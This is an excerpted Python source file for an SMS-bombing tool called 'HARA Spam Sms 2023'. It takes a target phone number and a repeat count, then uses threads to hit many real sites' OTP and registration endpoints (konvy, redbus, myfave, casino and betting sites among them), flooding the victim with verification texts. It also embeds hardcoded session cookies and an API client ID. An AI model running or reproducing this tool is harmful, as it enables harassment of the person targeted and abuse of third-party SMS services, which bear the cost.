...
os.system("clear")
os.system("cls & title HARA Spam Sms 2023 & mode 70,18")
...
"""
	...
	Anime.Fade(Center.Center(ui), Colors.blue_to_green, Colorate.Vertical, enter=True)
	gradient_print(
        """
                ...
                ╚═╝╩╚═╚═╝ ╚╝ ╚═╝╩╚═     ╩ ╚═╝╚═╝╩═╝╚═╝                                           
                      Made By :𝙔𝙪𝙢𝙮𝙪𝙢𝙎𝙥𝙖𝙢
            https://discord.gg/QmwthEpRBb | SPAMMER SMS 111 API
	...
	print("")
	phone = input(" \x1b[91m[\x1b[0m+\x1b[91m] \x1b[0mEnter Phone : ")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		os.system("clear")
		print()
		print('\x1b[96m[ Error ]\x1b[00m : \x1b[91mกรุณาใส่เบอร์ให้ครบ 10 หลัก [ ! ] \x1b[00m')
		time.sleep(1)
		os.system('clear')
	else:
		phone = phone
		amount = int(input(" \x1b[91m[\x1b[0m+\x1b[91m] \x1b[0mEnter Count : "))
		amount = amount
		print()
		print()
		HYPRES(phone, amount)
...
def api74(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post(f"https://api.shadowtak.fun/api.php?&phone={phone}&method=SMS")
    if r.status_code == 200 or r.status_code == 201:
	     printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def api77(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.get(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.1572308064.1653547614;_fbp=fb.1.1653547614308.1872923719;_gid=GA1.2.1794415642.1653547617;_tt_enable_cookie=1;_ttp=7eba6ff7-ff02-4342-b5dd-b9866f6efdee;f34c_cookieOrder_ID=38158040;PHPSESSID=uhm5651ofptiq9j3qn9rq4r8cl;f34c_new_user_view_count=%7B%22count%22%3A4%2C%22expire_time%22%3A1653634003%7D;_ga_Z9S47GV47R=GS1.1.1653557562.2.0.1653557563.0;_ga=GA1.2.1679688388.1653547616;_gat_UA-28072727-2=1"})
    if r.status_code == 200 or r.status_code == 201:
         printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def call2():
        head = {
            ...
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua-platform': 'Android',
            'origin': 'https://bkgame.bet',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://bkgame.bet/',
            'cookie': '_ga=GA1.2.1537890943.1642644396;PHPSESSID=vlhg6htsbo54m6hehlklpgtb53;_gid=GA1.2.650762125.1645633000' }
        response = requests.post(f'https://bkgame.bet/env/authen.php?requestotp', head, f'phone_number={phone}')
        printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")


def api86():
	requests.post(f"https://api.shadowtak.fun/api.php?&phone={phone}&method=SMS")
	printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def api95():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"})
	printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def api98():
	requests.post('https://www.msport1688.com/auth/otp_sender', headers=header, data={"phone": phone})
	printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def api102():
	requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})
	printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def api106():
	requests.post('https://api.sacasino9x.com/api/RegisterService/RequestOTP', headers=header, json={"Phone":phone})
	printx(f"{Fore.GREEN}|=======================>[  {phone} ] <=================|")
...
def HYPRES(phone, amount):
	for i in range(amount+10):
		...
		threading.submit(apicall01, phone)
		...
		threading.submit(api108, phone)
		threading.submit(api109, phone)
		threading.submit(api110, phone)
